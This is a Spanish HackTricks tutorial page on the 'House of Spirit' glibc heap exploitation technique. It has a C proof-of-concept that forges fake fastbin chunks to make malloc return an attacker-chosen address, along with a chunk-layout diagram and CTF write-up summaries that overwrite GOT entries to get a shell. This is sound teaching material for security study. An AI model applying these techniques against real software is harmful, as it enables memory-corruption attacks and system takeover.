# Casa del Espíritu

{{#include ../../banners/hacktricks-training.md}}

## Información Básica

### Código

<details>

<summary>Casa del Espíritu</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Code altered to add som prints from: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

struct fast_chunk {
size_t prev_size;
size_t size;
struct fast_chunk *fd;
struct fast_chunk *bk;
char buf[0x20];               // chunk falls in fastbin size range
};

int main() {
struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
void *ptr, *victim;

ptr = malloc(0x30);

printf("Original alloc address: %p\n", ptr);
printf("Main fake chunk:%p\n", &fake_chunks[0]);
printf("Second fake chunk for size: %p\n", &fake_chunks[1]);

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);

// Attacker overwrites a pointer that is about to be 'freed'
// Point to .fd as it's the start of the content of the chunk
ptr = (void *)&fake_chunks[0].fd;

free(ptr);

victim = malloc(0x30);
printf("Victim: %p\n", victim);

return 0;
}
```
</details>

### Objetivo

- Poder agregar una dirección en el tcache / fast bin para que luego sea posible asignarla.

### Requisitos

- Este ataque requiere que un atacante pueda crear un par de chunks rápidos falsos que indiquen correctamente el valor del tamaño y luego pueda liberar el primer chunk falso para que entre en el bin.

### Ataque

- Crear chunks falsos que eviten las verificaciones de seguridad: necesitarás 2 chunks falsos que indiquen en las posiciones correctas los tamaños correctos.
- De alguna manera, gestionar liberar el primer chunk falso para que entre en el fast o tcache bin y luego se asigne para sobrescribir esa dirección.

**El código de** [**guyinatuxedo**](https://guyinatuxedo.github.io/39-house_of_spirit/house_spirit_exp/index.html) **es excelente para entender el ataque.** Aunque este esquema del código lo resume bastante bien:
```c
/*
this will be the structure of our two fake chunks:
assuming that you compiled it for x64

+-------+---------------------+------+
| 0x00: | Chunk # 0 prev size | 0x00 |
+-------+---------------------+------+
| 0x08: | Chunk # 0 size      | 0x60 |
+-------+---------------------+------+
| 0x10: | Chunk # 0 content   | 0x00 |
+-------+---------------------+------+
| 0x60: | Chunk # 1 prev size | 0x00 |
+-------+---------------------+------+
| 0x68: | Chunk # 1 size      | 0x40 |
+-------+---------------------+------+
| 0x70: | Chunk # 1 content   | 0x00 |
+-------+---------------------+------+

for what we are doing the prev size values don't matter too much
the important thing is the size values of the heap headers for our fake chunks
*/
```
> [!NOTE]
> Tenga en cuenta que es necesario crear el segundo chunk para eludir algunas verificaciones de sanidad.

## Ejemplos

- **CTF** [**https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html**](https://guyinatuxedo.github.io/39-house_of_spirit/hacklu14_oreo/index.html)

- **Libc infoleak**: A través de un desbordamiento es posible cambiar un puntero para que apunte a una dirección GOT con el fin de filtrar una dirección libc a través de la acción de lectura del CTF.
- **House of Spirit**: Abusando de un contador que cuenta el número de "rifles", es posible generar un tamaño falso del primer chunk falso, luego abusando de un "mensaje" es posible falsificar el segundo tamaño de un chunk y finalmente, abusando de un desbordamiento, es posible cambiar un puntero que va a ser liberado para que nuestro primer chunk falso sea liberado. Luego, podemos asignarlo y dentro de él estará la dirección donde se almacena el "mensaje". Entonces, es posible hacer que esto apunte a la entrada `scanf` dentro de la tabla GOT, para que podamos sobrescribirlo con la dirección del sistema.\
La próxima vez que se llame a `scanf`, podemos enviar la entrada `"/bin/sh"` y obtener un shell.

- [**Gloater. HTB Cyber Apocalypse CTF 2024**](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/gloater/)
- **Glibc leak**: Búfer de pila no inicializado.
- **House of Spirit**: Podemos modificar el primer índice de un array global de punteros de heap. Con una sola modificación de byte, usamos `free` en un chunk falso dentro de un chunk válido, de modo que obtenemos una situación de chunks superpuestos después de asignar nuevamente. Con eso, un simple ataque de envenenamiento de Tcache funciona para obtener una primitiva de escritura arbitraria.

## Referencias

- [https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit)

{{#include ../../banners/hacktricks-training.md}}
